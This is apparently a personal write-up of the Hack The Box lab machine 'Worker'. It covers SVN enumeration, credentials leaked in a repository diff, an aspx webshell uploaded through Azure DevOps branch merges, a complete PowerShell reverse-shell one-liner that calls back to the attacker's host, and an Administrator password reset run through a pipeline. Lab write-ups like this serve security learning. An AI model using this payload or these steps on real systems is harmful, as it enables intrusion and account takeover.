Worker is a medium level room in Hackthebox. I learnt some new things like ```SVN```, ```Azure Devops``` and a lot more while doing this box. I hope you'll learn something from this post too. The objective is to get the user and root flag.

Connect to ```Hackthebox``` and let's go.

## <ins>Enumeration</ins>
---
Let's start with the usual nmap scan.
<br>
![nmap_scan](/assets/img/hackthebox/worker/nmap_scan.png)
<br>
I visited the ```http service``` runnning on the port ```80``` but I found nothing interesting. I tried bruteforcing hidden directories using ```gobuster``` and wasted my time unneccessarily. But, after running ```gobuster``` with the ```vhost``` subcommand in order to find ```virtual hosts```, it returned more than one vhost. I couldn't find which was the original one, so I started enumerating the next service.

I had no idea what ```SVN``` was, so I first checked the ```man pages```.
<br>
![svn_man_pages](/assets/img/hackthebox/worker/8.png)
<br>
Basically, ```SVN``` is a version control system like ```Git```. I got familiar with ```SVN``` from these ```cheat sheets```.
<br>

I added the domain name ```worker.htb``` to the ```/etc/hosts``` file in my local machine.

Firstly, I checked the remote repository information.
<br>
<pre>svn info svn://worker.htb</pre>
<br>
![svn_info](/assets/img/hackthebox/worker/4.png)
<br>
Then I tried to list the contents of the repository.
<br>
<pre>svn list svn://worker.htb</pre>
<br>
![svn_list](/assets/img/hackthebox/worker/5.png)
<br>
I checked everything inside the directory ```dimension.worker.htb``` but I found nothing useful. After checking the ```moved.txt``` in the root directory it said that the latest version can be viewed in ```http://devops.worker.htb```.
<br>
<pre>svn cat svn://worker.htb/moved.txt</pre>
<br>
![svn_cat](/assets/img/hackthebox/worker/7.png)
<br>
I finally found this file with valid credentials.
<br>
<pre>svn diff -r 2</pre>
<br>
![svn_diff](/assets/img/hackthebox/worker/9.png)
<br>
I added ```devops.worker.htb``` to ```/etc/hosts``` and logged in with the credentials.
<br>
![login_page](/assets/img/hackthebox/worker/10.png)
<br>
Navigate to ```Repos``` -> ```Branches```. Create a new branch and choose any one ```work items to link``` from the drop down. Click on create.

Go to the Branch. Upload a ```apsx webshell``` to the branch. The default location of ```aspx webshell``` is ```/usr/share/webshells/aspx/cmdasp.aspx``` in Kali Linux and Parrot OS. Add some items from ```work items to link``` dropdown box and click on ```Commit```.
<br>
![commit_box](/assets/img/hackthebox/worker/11.png)
<br>

Next, create a pull request.
<br>
![pull_request](/assets/img/hackthebox/worker/12.png)
<br>
In the pull requests page click on ```Approve``` and click on ```Complete``` to complete the pull request.
<br>
![approve_request](/assets/img/hackthebox/worker/13.png)
<br>
Check if all the required and optional conditions are met. Otherwise you're gonna have trouble merging the branch.
<br>
![check_merge](/assets/img/hackthebox/worker/14.png)
<br>
The ```Complete pull request``` dialog pops up. Click on ```Complete merge```. I recommend unchecking the ```delete branch after merging``` option since if you face any trouble later you don't need to repeat the process of creating a new branch.
<br>
![complete_request](/assets/img/hackthebox/worker/15.png)
<br>
Wait for a minute or two for the changes to take place.


## <ins>Reverse shell</ins>
---
After that go the the ```http://subdomain.worker.htb/file-name.aspx``` where ```subdomain``` is the name which you've selected during your branching and merging process. The subdomain name can be found just below the address bar of your browser. FYI..The subdomain I've taken is ```alpha```.

If you've done everything correctly, you should be able to see this page.
<br>
![aspx_page](/assets/img/hackthebox/worker/16.png)
<br>
From this page we can get the reverse shell. I grabbed the reverse shell payload for ```powershell``` and edited the ip and port values.
<br>
<pre>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('your-vpn-ip-addr',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
<br>
Open a netcat listener in your local machine and click on ```execute```.
<br>

<br>


## <ins>User flag</ins>
---
I checked the ```C:\Users``` folder and found the username ```robisl```.
<br>
![users_folder](/assets/img/hackthebox/worker/18.png)
<br>
After a bit of enumerating, I found that the machine has another volume ```W:\```.
<br>
<pre>Get-Volume</pre>
<br>
![another_volume](/assets/img/hackthebox/worker/19.png)
<br>
After changing the volume, I found the ```svnrepos``` folder. I searched throughout the folder and came across this file named ```passwd``` in the ```W:\snvrepos\www\conf``` folder.
<br>
![passwd_file](/assets/img/hackthebox/worker/21.png) 
<br>
I got the contents of the file using the ```type file-name``` command. The password will be in the same line as the name of the user ```robisl```.

I used ```evil-winrm``` to get a shell for the user ```robisl```.
<br>
<pre>./evil-winrm.rb -u robisl -p password-from-passwd-file -i worker.htb</pre>
<br>
![evil_winrm1](/assets/img/hackthebox/worker/22.png)
<br>
I found the ```user flag``` in the ```C:\Users\robisl\Desktop``` folder.
<br>
![user_flag](/assets/img/hackthebox/worker/23.png)
<br>


## <ins>Root flag</ins>
---
This is the part I've been stuck for a long time. After figuring it out, I felt like an idiot for missing such a trivial thing.

Just login to ```Azure Devops``` with the username ```robisl``` and the corresponding password.
<br>
![login_page](/assets/img/hackthebox/worker/24.png)
<br>
I wondered on how to get the root shell since the same process of creating a branch and merging is not gonna work here. After a little help from google, I found that ```Pipelines``` can be used to run commands in ```Azure devops```.

So, I started by creating a new ```Pipeline```.
<br>
![pipeline_azure](/assets/img/hackthebox/worker/25.png)
<br>
Select ```Azure Repos Git``` -> ```Starter pipeline```.

Edit the ```.yaml``` file such that only this content is present. Save the pipeline by clicking on the ```Create a new branch for this commit and start a pull request``` and rename the pipeline.
<br>
![scritp_yaml](/assets/img/hackthebox/worker/26.png)
<br>
After clicking on ```save and run``` the script successfully executes. You can check the results in the ```Run a one line script``` tab.
<br>
![oneline_script](/assets/img/hackthebox/worker/31.png)
<br>
We can exploit this script and get the root shell. First, I tried the powershell one-line reverse shell payload and the script throwed an error. So, I tried to type out the root flag which actually succeded. I didn't want to stop at only getting the root flag, so I googled the possible ways to get the ```Administrator's password```.

I finally arrived at changing the ```Administrator's password```, which can be done using the ```net user``` command in windows.
<br>
![admin_passwd_change](/assets/img/hackthebox/worker/28.png)
<br>
Sorry for the insanely long password. The script throwed an error stating that the ```password policy is not met```. So, I got a little irritated and finally did this password. At last!!! the script executed.
<br>
![admin_passwd_change](/assets/img/hackthebox/worker/29.png)
<br>

I used ```evil-winrm``` to get a powershell.
<br>
![admin_shell](/assets/img/hackthebox/worker/32.png)
<br>
The root flag can be found in the ```C:\Users\Administrator\Desktop``` folder.

Got both the root shell and root flag. Now, I'm satisfied...

Peace out...!!!

That's it folks. Happy hacking!!!
